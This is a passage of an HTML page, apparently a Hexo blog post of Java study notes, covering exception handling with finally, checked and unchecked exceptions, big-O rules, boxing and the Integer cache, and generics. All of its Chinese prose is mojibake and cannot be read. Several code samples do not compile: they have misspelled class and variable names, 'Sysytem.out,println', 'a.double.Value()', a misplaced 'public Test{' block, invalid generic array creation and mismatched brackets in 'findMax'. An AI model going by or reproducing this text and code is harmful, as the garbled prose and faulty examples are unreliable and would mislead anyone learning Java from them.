start="4"><li>å¯ä»¥é€šè¿‡ä¸€ä¸ªcatchæ•è·æ‰€æœ‰çš„å¼‚å¸¸ï¼Œå³å¤šä¸ªå¼‚å¸¸ï¼Œä¸€æ¬¡æ•è·(ä¸æ¨è)</li></ol><h5 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h5><p>åœ¨å†™ç¨‹åºæ—¶ï¼Œæœ‰äº›ç‰¹å®šçš„ä»£ç ï¼Œä¸è®ºç¨‹åºæ˜¯å¦å‘ç”Ÿå¼‚å¸¸ï¼Œéƒ½éœ€è¦æ‰§è¡Œï¼Œæ¯”å¦‚ç¨‹åºä¸­æ‰“å¼€çš„èµ„æºï¼šç½‘ç»œè¿æ¥ã€æ•°æ®åº“ è¿æ¥ã€IOæµç­‰ï¼Œåœ¨ç¨‹åºæ­£å¸¸æˆ–è€…å¼‚å¸¸é€€å‡ºæ—¶ï¼Œå¿…é¡»è¦å¯¹èµ„æºè¿›è¿›è¡Œå›æ”¶ã€‚å¦å¤–ï¼Œå› ä¸ºå¼‚å¸¸ä¼šå¼•å‘ç¨‹åºçš„è·³è½¬ï¼Œå¯èƒ½ å¯¼è‡´æœ‰äº›è¯­å¥æ‰§è¡Œä¸åˆ°ï¼Œfinallyå°±æ˜¯ç”¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="comment">// å¯èƒ½ä¼šå‘ç”Ÿå¼‚å¸¸çš„ä»£ç </span></span><br><span class="line">&#125;<span class="keyword">catch</span>(å¼‚å¸¸ç±»å‹ e)&#123;</span><br><span class="line"><span class="comment">// å¯¹æ•è·åˆ°çš„å¼‚å¸¸è¿›è¡Œå¤„ç†</span></span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line"><span class="comment">// æ­¤å¤„çš„è¯­å¥æ— è®ºæ˜¯å¦å‘ç”Ÿå¼‚å¸¸ï¼Œéƒ½ä¼šè¢«æ‰§è¡Œåˆ°</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å¦‚æœæ²¡æœ‰æŠ›å‡ºå¼‚å¸¸ï¼Œæˆ–è€…å¼‚å¸¸è¢«æ•è·å¤„ç†äº†ï¼Œè¿™é‡Œçš„ä»£ç ä¹Ÿä¼šæ‰§è¡Œ</span></span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong><br>finallyä¸­çš„ä»£ç ä¸€å®šä¼šæ‰§è¡Œçš„ï¼Œä¸€èˆ¬åœ¨finallyä¸­è¿›è¡Œä¸€äº›èµ„æºæ¸…ç†çš„æ‰«å°¾å·¥ä½œã€‚<br>finallyä¸­çš„è¯­å¥ä¸€å®šä¼šæ‰§è¡Œ</p><p><strong>throwå’Œthrowçš„åŒºåˆ«</strong></p><p>throwæ˜¯æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸<br>throwsæ˜¯å¯¹ä¸€ä¸ªå¼‚å¸¸çš„å£°æ˜</p><h4 id="å¼‚å¸¸çš„å¤„ç†æµç¨‹"><a href="#å¼‚å¸¸çš„å¤„ç†æµç¨‹" class="headerlink" title="å¼‚å¸¸çš„å¤„ç†æµç¨‹"></a>å¼‚å¸¸çš„å¤„ç†æµç¨‹</h4><p>ç¨‹åºå…ˆæ‰§è¡Œtry ä¸­çš„ä»£ç <br>å¦‚æœtryä¸­çš„ä»£ç å‡ºç°å¼‚å¸¸,å°±ä¼šç»“æŸtry ä¸­çš„ä»£ç ,çœ‹å’Œcatchä¸­çš„å¼‚å¸¸ç±»å‹æ˜¯å¦åŒ¹é….å¦‚æœæ‰¾åˆ°åŒ¹é…çš„å¼‚å¸¸ç±»å‹,å°±ä¼šæ‰§è¡Œcatchä¸­çš„ä»£ç <br>å¦‚æœæ²¡æœ‰æ‰¾åˆ°åŒ¹é…çš„å¼‚å¸¸ç±»å‹,å°±ä¼šå°†å¼‚å¸¸å‘ä¸Šä¼ é€’åˆ°ä¸Šå±‚è°ƒç”¨è€….<br>æ— è®ºæ˜¯å¦æ‰¾åˆ°åŒ¹é…çš„å¼‚å¸¸ç±»å‹, finallyä¸­çš„ä»£ç éƒ½ä¼šè¢«æ‰§è¡Œåˆ°(åœ¨è¯¥æ–¹æ³•ç»“æŸä¹‹å‰æ‰§è¡Œ).å¦‚æœä¸Šå±‚è°ƒç”¨è€…ä¹Ÿæ²¡æœ‰å¤„ç†çš„äº†å¼‚å¸¸,å°±ç»§ç»­å‘ä¸Šä¼ é€’.<br>ä¸€ç›´åˆ°mainæ–¹æ³•ä¹Ÿæ²¡æœ‰åˆé€‚çš„ä»£ç å¤„ç†å¼‚å¸¸,å°±ä¼šäº¤ç»™â…£M-æ¥è¿›è¡Œå¤„ç†,æ­¤æ—¶ç¨‹åºå°±ä¼šå¼‚å¸¸ç»ˆæ­¢.</p><h4 id="è‡ªå®šä¹‰å¼‚å¸¸"><a href="#è‡ªå®šä¹‰å¼‚å¸¸" class="headerlink" title="è‡ªå®šä¹‰å¼‚å¸¸"></a>è‡ªå®šä¹‰å¼‚å¸¸</h4><p> 1.è‡ªå®šä¹‰å¼‚å¸¸ç±»ï¼Œç„¶åç»§æ‰¿è‡ªException æˆ–RunTimeException </p><ol start="2"><li>å®ç°ä¸€ä¸ªå¸¦æœ‰Stringç±»å‹å‚æ•°çš„æ„é€ æ–¹æ³•ï¼Œå‚æ•°å«ä¹‰ï¼šå‡ºç°å¼‚å¸¸çš„åŸå› </li></ol><p><strong>æ³¨æ„</strong><br>è‡ªå®šä¹‰å¼‚å¸¸é€šå¸¸ä¼šç»§æ‰¿è‡ª Exception æˆ–è€… RuntimeException ç»§æ‰¿è‡ª Exception çš„å¼‚å¸¸é»˜è®¤æ˜¯å—æŸ¥å¼‚å¸¸ ç»§æ‰¿è‡ª RuntimeException çš„å¼‚å¸¸é»˜è®¤æ˜¯éå—æŸ¥å¼‚å¸¸</p><p><strong>å—æŸ¥å¼‚å¸¸</strong><br>IOExceptionï¼ˆåŒè¾“å…¥è¾“å‡ºç›¸å…³çš„æ“ä½œï¼Œå¦‚æ— æ•ˆè¾“å…¥ï¼Œæ‰“å¼€ä¸€ä¸ªä¸å­˜åœ¨åœ¨æ–‡ä»¶ï¼‰<br>ClassNotFoundExceptionï¼ˆä½¿ç”¨ä¸å­˜åœ¨çš„ç±»ï¼‰</p><p>ç‰¹å¾ï¼šç¼–è¯‘å°±ä¸èƒ½é€šè¿‡ã€‚æ–¹æ³•è¦æŠ›å‡ºçš„å—æŸ¥å¼‚å¸¸å¿…é¡»åœ¨æ–¹æ³•å¤´ä¸­æ˜¾ç¤ºå£°æ˜ï¼Œç„¶åç¼–è¯‘å™¨ä¼šæ ¸æŸ¥æ˜¯å¦ä¸ºæ‰€æœ‰çš„å—æŸ¥å¼‚å¸¸æä¾›äº†æ„é€ å™¨ï¼ˆtry-catchï¼‰ã€‚</p><p><strong>éå—æŸ¥å¼‚å¸¸</strong><br>ArithmeticExceptionï¼ˆç®—æ•°å¼‚å¸¸ï¼‰<br>NullPointerExceptionï¼ˆæŒ‡å‘å¯¹è±¡ä¸ºç©ºå¼‚å¸¸ï¼‰<br>IndexOutOfBoundsExceptionï¼ˆæ•°ç»„è¶…æ ‡å¼‚å¸¸ï¼‰<br>IllegalArgumentExceptionï¼ˆä¼ é€’éæ³•å‚æ•°å¼‚å¸¸ï¼‰</p><p>ç‰¹å¾ï¼šå¯ä»¥é€šè¿‡ç¼–è¯‘ï¼Œä»åå­—çŸ¥é“ï¼Œä»–çš„é”™è¯¯å‘ç”Ÿåœ¨è¿è¡Œæ—¶ï¼Œä¸Šé¢çš„ 1&#x2F;0 å°±æ˜¯ä¸€ä¸ªç®—æ•°å¼‚å¸¸ï¼Œå®ƒå¯ä»¥é€šè¿‡ç¼–è¯‘ï¼Œä½†æ— æ³•è¿è¡Œã€‚ä¸è¦æ±‚æ˜¾ç¤ºå£°æ˜éå—æŸ¥å¼‚å¸¸ï¼ˆtry-catchæ˜¯æ— æ³•è§£å†³REå¼‚å¸¸çš„ï¼Œä½†æ˜¯ä»æ—§å¯ä»¥æ•æ‰REå¼‚å¸¸ï¼‰ã€‚</p><h3 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h3><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240213105150875.png" alt="image-20240213105150875"></p><h3 id="æ—¶é—´å¤æ‚åº¦å’Œç©ºé—´å¤æ‚åº¦"><a href="#æ—¶é—´å¤æ‚åº¦å’Œç©ºé—´å¤æ‚åº¦" class="headerlink" title="æ—¶é—´å¤æ‚åº¦å’Œç©ºé—´å¤æ‚åº¦"></a>æ—¶é—´å¤æ‚åº¦å’Œç©ºé—´å¤æ‚åº¦</h3><p>1ã€ç”¨å¸¸æ•°1å–ä»£è¿è¡Œæ—¶é—´ä¸­çš„æ‰€æœ‰åŠ æ³•å¸¸æ•°ã€‚<br>2ã€åœ¨ä¿®æ”¹åçš„è¿è¡Œæ¬¡æ•°å‡½æ•°ä¸­ï¼Œåªä¿ç•™æœ€é«˜é˜¶é¡¹ã€‚<br>3ã€å¦‚æœæœ€é«˜é˜¶é¡¹å­˜åœ¨ä¸”ä¸æ˜¯1ï¼Œåˆ™å»é™¤ä¸è¿™ä¸ªé¡¹ç›®ç›¸ä¹˜çš„å¸¸æ•°ã€‚å¾—åˆ°çš„ç»“æœå°±æ˜¯å¤§Oé˜¶ã€‚</p><p>ä¸¤ä¸ªç®—æ³•ä¹³æ²Ÿæ¯”è¾ƒå¤æ‚åº¦æ—¶ æ¯”è¾ƒæœ€åæƒ…å†µ</p><p><strong>é€’å½’çš„å¤æ‚åº¦ &#x3D; é€’å½’çš„æ¬¡æ•° * æ¯æ¬¡é€’å½’çš„æ¬¡æ•°</strong></p><h3 id="åŒ…è£…ç±»"><a href="#åŒ…è£…ç±»" class="headerlink" title="åŒ…è£…ç±»"></a>åŒ…è£…ç±»</h3><p>javaä¸­åŸºæœ¬ç±»å‹ä¸æ˜¯ç»§æ‰¿è‡ªobject éäº†åœ¨æ³›å‹ä»£ç ä¸­æ”¯æŒåŸºæœ¬ç±»å‹ javaç»™æ¯ä¸ªåŸºæœ¬ç±»å‹ä¸€ä¸ªåŒ…è£…ç±»å‹</p><h4 id="è£…ç®±"><a href="#è£…ç®±" class="headerlink" title="è£…ç®±"></a>è£…ç®±</h4><p>æŠŠä¸€ä¸ªåŸºæœ¬æ•°æ®ç±»å‹è½¬åŒ–ä¸ºåŒ…è£…ç±»å‹çš„æ•°æ®<br><strong>åˆ†ç±»</strong><br>è‡ªåŠ¨è£…ç®±ï¼ˆéšå¼ï¼‰<br>æ˜¾ç¤ºè£…ç®±</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">b</span> <span class="operator">=</span> a;</span><br><span class="line"><span class="comment">//è¾“å‡ºbä¸º10 éšå¼è£…ç®±</span></span><br><span class="line"></span><br><span class="line"><span class="type">Integer</span> <span class="variable">c</span> <span class="operator">=</span> Integer.valueOf(a);</span><br><span class="line"><span class="comment">//æ˜¾ç¤ºè£…ç®±</span></span><br></pre></td></tr></table></figure><h3 id="æ‹†ç®±"><a href="#æ‹†ç®±" class="headerlink" title="æ‹†ç®±"></a>æ‹†ç®±</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">10</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> a;</span><br><span class="line"><span class="comment">//è‡ªåŠ¨æ‹†ç®±</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ˜¾ç¤ºæ‹†ç®± æ‹†ç®±ä¸ºè‡ªå·±æŒ‡å®šçš„å…ƒç´ </span></span><br><span class="line"><span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> a.intValue();</span><br><span class="line"><span class="type">double</span> <span class="variable">d</span> <span class="operator">=</span> a.<span class="type">double</span>.Value();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">System.out.println(a == b);</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">a2</span> <span class="operator">=</span> <span class="number">200</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="number">200</span>;</span><br><span class="line">System.out.println(a2 == b2);</span><br><span class="line"><span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>valueOfåº•å±‚æºç èŒƒå›´ä¸º-128~127ï¼ˆ256ï¼‰è¶…å‡ºèŒƒå›´ç›¸å½“äºnewäº†ä¸€ä¸ªæ–°å¯¹è±¡ return false</p><h3 id="æ³›å‹"><a href="#æ³›å‹" class="headerlink" title="æ³›å‹"></a>æ³›å‹</h3><p>ä¸€èˆ¬çš„ç±»å’Œæ–¹æ³• åªèƒ½ä½¿ç”¨å…·ä½“çš„ç±»å‹ï¼ˆåŸºæœ¬ç±»å‹&#x2F;è‡ªå®šä¹‰çš„ç±»ï¼‰</p><p>JDK1.5å¼•å…¥ æ³›å‹ é€‚ç”¨äºå¤šç§ç±»å‹ ä»ä»£ç ä¸Šè®²å°±æ˜¯å¯¹ç±»å‹å®ç°äº†å‚æ•°åŒ–</p><h4 id="å¼•å‡ºæ³›å‹"><a href="#å¼•å‡ºæ³›å‹" class="headerlink" title="å¼•å‡ºæ³›å‹"></a>å¼•å‡ºæ³›å‹</h4><p><strong><T>ä»£è¡¨å½“å‰ç±»æ˜¯æ³›å‹ç±»</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> Object[] array = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">10</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> pos,Object val)</span>&#123;</span><br><span class="line">      array[pos] = val;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(<span class="type">int</span> pos)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> array[pos];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Test&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">            <span class="type">Myarray</span> <span class="variable">myarry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myarray</span>();</span><br><span class="line">            myArray.set(<span class="number">0</span>,<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">            myArray.set(<span class="number">1</span>,<span class="number">90</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> myArray.get(<span class="number">0</span>);</span><br><span class="line">       <span class="comment">//æŠ¥é”™ getæ–¹æ³•çš„è¿”å›å€¼ æ˜¯Object çˆ¶ç±»ç»™å­ç±»éœ€è¦å¼ºè½¬</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span>ï¼ˆStringï¼‰myArray.get(<span class="number">0</span>);</span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span>&lt;T&gt;&#123;</span><br><span class="line">  <span class="keyword">public</span> Object[] array = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">10</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> pos,T val)</span>&#123;</span><br><span class="line">      array[pos] = val;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">get</span><span class="params">(<span class="type">int</span> pos)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (T)array[pos];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Test&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">       Myarray&lt;String&gt; myarry = <span class="keyword">new</span> <span class="title class_">Myarray</span>&lt;&gt;();</span><br><span class="line">            myArray.set(<span class="number">0</span>,<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">           <span class="comment">//myArray.set(1,90);</span></span><br><span class="line">           <span class="comment">//è¿™é‡Œå°±ä¸èƒ½æ”¾æ•´å‹äº†</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> myArray.get(<span class="number">0</span>);<span class="comment">//ä¸ç”¨å¼ºè½¬</span></span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶æ•°ç»„æ˜¯Objectç±»å‹çš„å…ƒç´  ä½†æ˜¯returnå¼ºè½¬ä¸ºTç±»å‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span>&lt;T&gt;&#123;</span><br><span class="line">  <span class="keyword">public</span> Object[] array = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">10</span>];</span><br><span class="line">  <span class="comment">//å»ºè®®çš„å†™æ³•</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> pos,T val)</span>&#123;</span><br><span class="line">      array[pos] = val;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">get</span><span class="params">(<span class="type">int</span> pos)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (T)array[pos];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Test&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">       Myarray&lt;String&gt; myarry = <span class="keyword">new</span> <span class="title class_">Myarray</span>&lt;&gt;();</span><br><span class="line">            myArray.set(<span class="number">0</span>,<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">           <span class="comment">//myArray.set(1,90);</span></span><br><span class="line">           <span class="comment">//è¿™é‡Œå°±ä¸èƒ½æ”¾æ•´å‹äº†</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> myArray.get(<span class="number">0</span>);<span class="comment">//ä¸ç”¨å¼ºè½¬</span></span><br><span class="line">            System.out.println(str);</span><br><span class="line">           </span><br><span class="line">      MyArray&lt;Integer&gt; myArray2 = <span class="keyword">new</span> <span class="title class_">AyArray</span>&lt;&gt;();</span><br><span class="line">      </span><br><span class="line">           MyArray2.set(<span class="number">1</span>,<span class="number">11</span>);</span><br><span class="line">           MyArray2.set(<span class="number">1</span>,<span class="string">&quot;123&quot;</span>);<span class="comment">//æŠ¥é”™ ä½¿ç”¨æ³›å‹ç¼–è¯‘å™¨è¾…åŠ©æ£€æŸ¥ åªèƒ½ä½¿ç”¨ä¼ å‚ç»™Tç±»å‹çš„å‚æ•°</span></span><br><span class="line"></span><br><span class="line">           <span class="type">Integer</span> <span class="variable">a</span> <span class="operator">=</span> mySrray.get(<span class="number">0</span>);</span><br><span class="line">           Sysytem.out,println(a);<span class="comment">//å¯ç›´æ¥æ‰“å°</span></span><br><span class="line">       &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ³›å‹çš„ä¸»è¦ç›®çš„"><a href="#æ³›å‹çš„ä¸»è¦ç›®çš„" class="headerlink" title="æ³›å‹çš„ä¸»è¦ç›®çš„"></a>æ³›å‹çš„ä¸»è¦ç›®çš„</h4><p>æŒ‡å®šå½“å‰å®¹å™¨ è¦æŒæœ‰ä»€ä¹ˆç±»å‹çš„å¯¹è±¡ è®©ç¼–è¯‘å™¨å»æ£€æŸ¥</p><p>æ³›å‹ä¸­ä¸å…è®¸ å®ä¾‹åŒ–ä¸€ä¸ªç±»å‹çš„æ•°ç»„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> T[] array = <span class="keyword">new</span> <span class="title class_">T</span>[<span class="number">10</span>];</span><br><span class="line"><span class="comment">//æŠ¥é”™</span></span><br><span class="line"><span class="keyword">public</span> T[] array = <span class="keyword">new</span> (T[])Object[<span class="number">10</span>];<span class="comment">//ä¸ä¸€å®šå¥½ æŠ¥è­¦å‘Š</span></span><br></pre></td></tr></table></figure><hr><p><strong>æ³›å‹åªæ¥æ”¶ç±»</strong> <strong>åŸºæœ¬æ•°æ®ç±»å‹å¿…é¡»ä½¿ç”¨åŒ…è£…ç±»</strong><br>&lt;&gt;ä¸­åªèƒ½æ˜¯å¼•ç”¨ç±»å‹ ä¸èƒ½æ˜¯åŸºæœ¬ç±»å‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MyArray &lt;<span class="type">int</span>&gt;myArry = <span class="keyword">new</span> <span class="title class_">AyArray</span>&lt;&gt;();<span class="comment">//x</span></span><br><span class="line">MyArray &lt;Integer&gt;myArry = <span class="keyword">new</span> <span class="title class_">AyArray</span>&lt;&gt;();<span class="comment">//v</span></span><br></pre></td></tr></table></figure><h4 id="æ³›å‹æ˜¯å¦‚ä½•ç¼–è¯‘çš„"><a href="#æ³›å‹æ˜¯å¦‚ä½•ç¼–è¯‘çš„" class="headerlink" title="æ³›å‹æ˜¯å¦‚ä½•ç¼–è¯‘çš„"></a>æ³›å‹æ˜¯å¦‚ä½•ç¼–è¯‘çš„</h4><p> ç¼–è¯‘çš„æ—¶å€™ å°†æ‰€æœ‰çš„Tæ“¦é™¤ä¸ºObject è¿è¡Œæ—¶ æ²¡æœ‰æ³›å‹è¿™æ ·çš„æ¦‚å¿µã€æ³›å‹çš„æ“¦é™¤æœºåˆ¶åªå­˜åœ¨äºç¼–è¯‘æœŸé—´ã€‘ </p><h4 id="æ³›å‹çš„ä¸Šç•Œï¼ˆextends-æ‹“å±•ï¼‰"><a href="#æ³›å‹çš„ä¸Šç•Œï¼ˆextends-æ‹“å±•ï¼‰" class="headerlink" title="æ³›å‹çš„ä¸Šç•Œï¼ˆextends æ‹“å±•ï¼‰"></a>æ³›å‹çš„ä¸Šç•Œï¼ˆextends æ‹“å±•ï¼‰</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Number</span>&gt;&#123;</span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//Numberä¸ºä¸Šç•Œ ä¸€å®šä¸ºTçš„çˆ¶ç±»</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Alg</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Compable</span>&lt;T&gt;&gt;&#123;<span class="comment">//Tä¸€å®šå®ç°compareableæ¥å£</span></span><br><span class="line">   <span class="keyword">public</span> T <span class="title function_">findMax</span><span class="params">(T[] array]&#123;</span></span><br><span class="line"><span class="params">       T max = array[<span class="number">0</span>];</span></span><br><span class="line"><span class="params">   <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; array.length; i++)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(array[i].compareTo(max)&gt; <span class="number">0</span>)&#123;</span><br><span class="line">             max = arry[i];</span><br><span class="line">        &#125;</span><br><span class="line">   &#125;</span><br><span class="line">          <span class="keyword">return</span> max;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">                    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Alg&lt;Integer&gt; alg = <span class="keyword">new</span> <span class="title class_">Alg</span>&lt;&gt;();</span><br><span class="line">        Integer[] array = &#123;<span class="number">5</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">8</span>&#125;;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">ret</span> <span class="operator">=</span> alg.findMax(arry);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">        <span class="comment">//return 9</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ³›å‹æ–¹æ³•"><a href="#æ³›å‹æ–¹æ³•" class="headerlink" title="æ³›å‹æ–¹æ³•"></a>æ³›å‹æ–¹æ³•</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Alg</span>&#123;</span><br><span class="line">   <span class="keyword">public</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;T&gt;&gt; T <span class="title function_">findMax</span><span class="params">(T[] array]&#123;</span></span><br><span class="line"><span class="params">       T max = array[<span class="number">0</span>];</span></span><br><span class="line"><span class="params">   <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; array.length; i++)</span>&#123;</span><br><span class="line">        <span 